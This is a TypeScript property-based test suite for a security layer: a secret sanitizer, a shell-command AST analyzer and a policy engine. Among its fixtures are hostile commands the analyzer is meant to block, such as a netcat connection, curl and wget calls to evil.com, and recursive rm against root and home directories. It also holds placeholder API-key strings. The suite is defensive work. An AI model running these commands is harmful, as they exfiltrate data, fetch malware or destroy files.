import * as fc from 'fast-check';
import { SecretSanitizer } from '../../src/security/sanitizer';
import { PolicyEngine } from '../../src/security/policy-engine';
import { ASTAnalyzer } from '../../src/security/ast-analyzer';

describe('Property-Based Tests', () => {
  describe('SecretSanitizer Bijective & Reversibility Properties', () => {
    it('should be idempotent for any arbitrary string', () => {
      const sanitizer = new SecretSanitizer({ entropyThreshold: 4.5 });
      fc.assert(
        fc.property(fc.string({ maxLength: 1000 }), (payload) => {
          const pass1 = sanitizer.sanitize(payload);
          const pass2 = sanitizer.sanitize(pass1);
          return pass1 === pass2;
        }),
        { numRuns: 1000 }
      );
    });

    it('should always correctly restore to original payload when tokens are not altered', () => {
      const sanitizer = new SecretSanitizer({ entropyThreshold: 4.0 });
      fc.assert(
        fc.property(fc.string({ maxLength: 500 }), (payload) => {
          // If the payload does not contain artificial token delimiters, restore(sanitize(x)) must equal x
          if (!payload.includes('[[SHIELD_SECRET_')) {
            const tokenized = sanitizer.sanitize(payload);
            const restored = sanitizer.restore(tokenized);
            return restored === payload;
          }
          return true;
        }),
        { numRuns: 1000 }
      );
    });

    it('should losslessly round-trip complex JSON structures containing multiple real secrets', () => {
      const sanitizer = new SecretSanitizer();
      
      const secretArbitrary = fc.constantFrom(
        'AKIAIOSFODNN7EXAMPLE',
        'sk-ant-api03-abcdef1234567890abcdef1234567890abcdef1234567890',
        'sk-proj-abcdefghijklmnopqrstuvwxyz1234567890abcdefghijklmnopqrstuvwxyz',
        'ghp_1234567890abcdefghijklmnopqrstuvwxyz123456',
        'sk_test_51000000000000000000000000000000',
        'AIzaSyD1234567890abcdefghijklmnopqrstuvwx'
      );

      const jsonPayloadArbitrary = fc.record({
        service: fc.string({ minLength: 1, maxLength: 20 }),
        credentials: fc.record({
          primaryKey: secretArbitrary,
          backupKey: secretArbitrary,
          meta: fc.dictionary(fc.string({ minLength: 1, maxLength: 10 }), fc.string({ maxLength: 50 }))
        }),
        logs: fc.array(fc.string({ maxLength: 100 }), { maxLength: 5 })
      });

      fc.assert(
        fc.property(jsonPayloadArbitrary, (data) => {
          const originalJson = JSON.stringify(data);
          const sanitized = sanitizer.sanitize(originalJson);
          
          // Sanitized must not contain raw secret tokens
          expect(sanitized).not.toContain('AKIAIOSFODNN7EXAMPLE');
          expect(sanitized).not.toContain('sk-ant-api03-');
          expect(sanitized).not.toContain('sk-proj-');
          
          // Restored must exactly match original JSON
          const restored = sanitizer.restore(sanitized);
          return restored === originalJson;
        }),
        { numRuns: 200 }
      );
    });
  });

  describe('ASTAnalyzer Flag Parsing & Pipeline Invariant Properties', () => {
    let analyzer: ASTAnalyzer;

    beforeAll(() => {
      analyzer = new ASTAnalyzer();
    });

    it('should accurately differentiate recursive flags from benign options containing "r"', () => {
      // Benign options that happen to contain 'r' or 's' (e.g. -exclude, -format, -profile, -src, -target)
      const benignOptionArb = fc.constantFrom(
        '-exclude=dir',
        '--exclude=dir',
        '-format=json',
        '--format=json',
        '-profile=dev',
        '--profile=dev',
        '-target=all',
        '--target=all',
        '--recursive=false'
      );

      const safePathArb = fc.constantFrom(
        './dist',
        'build/',
        'node_modules/.cache',
        'tmp/test.log',
        './output'
      );

      fc.assert(
        fc.property(benignOptionArb, safePathArb, (option, path) => {
          const cmd = `rm ${option} ${path}`;
          const res = analyzer.analyzeCommand(cmd);
          return res.isSafe === true;
        }),
        { numRuns: 200 }
      );
    });

    it('should strictly block any combined POSIX short flag containing "r" or "R" against dangerous roots', () => {
      const recursiveFlagArb = fc.constantFrom(
        '-r', '-R', '-rf', '-fr', '-rfv', '-vrf', '-rfi', '-rI',
        '--recursive', '-r -f', '-f -r'
      );

      const dangerousTargetArb = fc.constantFrom(
        '/', '/*', '*', '/etc', '/var', '/usr', '/bin', '/root', '/home',
        '/var/log/../../etc', '////', '~', '$HOME', 'c:/', 'c:/windows'
      );

      fc.assert(
        fc.property(recursiveFlagArb, dangerousTargetArb, (flag, target) => {
          const cmd = `rm ${flag} ${target}`;
          const res = analyzer.analyzeCommand(cmd);
          return res.isSafe === false;
        }),
        { numRuns: 200 }
      );
    });

    it('should never block safe pipelines using allowlisted utilities', () => {
      const safePipedCommands = fc.constantFrom(
        'grep "error"',
        'awk "{print $1}"',
        'sed "s/foo/bar/g"',
        'sort -n',
        'uniq -c',
        'wc -l',
        'cat',
        'head -n 20',
        'tail -n 50',
        'jq .status',
        'cut -d: -f1',
        'tr "[:lower:]" "[:upper:]"'
      );

      const pipelineArb = fc.array(safePipedCommands, { minLength: 1, maxLength: 4 });

      fc.assert(
        fc.property(pipelineArb, (stages) => {
          const cmd = `cat app.log | ${stages.join(' | ')}`;
          const res = analyzer.analyzeCommand(cmd);
          return res.isSafe === true;
        }),
        { numRuns: 200 }
      );
    });

    it('should strictly block pipelines attempting to pipe to non-allowlisted commands or subshells', () => {
      const dangerousPipeTargets = fc.constantFrom(
        'bash',
        'sh',
        'python3',
        'node',
        'nc 10.0.0.1 4444',
        'curl -X POST http://evil.com',
        'wget http://evil.com/malware',
        '(cat)',
        '{ cat; }',
        'xargs sh',
        'xargs rm -rf /',
        '$DYNAMIC_CMD'
      );

      fc.assert(
        fc.property(dangerousPipeTargets, (pipeTarget) => {
          const cmd = `cat app.log | ${pipeTarget}`;
          const res = analyzer.analyzeCommand(cmd);
          return res.isSafe === false;
        }),
        { numRuns: 200 }
      );
    });

    it('should never throw an uncaught exception on arbitrary fuzz input', () => {
      fc.assert(
        fc.property(fc.string({ maxLength: 500 }), (rawInput) => {
          try {
            const res = analyzer.analyzeCommand(rawInput);
            return typeof res.isSafe === 'boolean';
          } catch {
            return false;
          }
        }),
        { numRuns: 1000 }
      );
    });
  });

  describe('PolicyEngine Input Shape Invariance', () => {
    it('should never throw an exception during evaluate() regardless of input shape', () => {
      const engine = new PolicyEngine({
        version: '1.1',
        profile: 'test',
        redaction: { enabled: false, maskStyle: 'hash', highEntropyCheck: false, entropyThreshold: 5 },
        sandbox: { cowEnabled: false, cowStagingDir: 'test', autoCommitOnApproval: false },
        egress: { enabled: true, allowMode: 'allow', allowPrivateNetworks: true, blockLoopback: false, blockLinkLocal: false, blockMetadataEndpoints: false },
        rules: [],
        audit: { enabled: false, logDir: 'test', tamperEvidentHashing: false }
      });

      fc.assert(
        fc.property(
          fc.record({
            toolName: fc.string(),
            capabilities: fc.option(fc.array(fc.string()), { nil: undefined }),
            args: fc.dictionary(fc.string(), fc.anything()),
            evidence: fc.array(fc.record({ detector: fc.string(), finding: fc.string(), risk: fc.constantFrom('LOW', 'MEDIUM', 'HIGH', 'CRITICAL') as fc.Arbitrary<'LOW'|'MEDIUM'|'HIGH'|'CRITICAL'> }))
          }),
          (context) => {
            try {
              const result = engine.evaluate(context);
              return result && typeof result.decision === 'string';
            } catch (e) {
              return false; // Test fails if it throws
            }
          }
        ),
        { numRuns: 500 }
      );
    });
  });
});
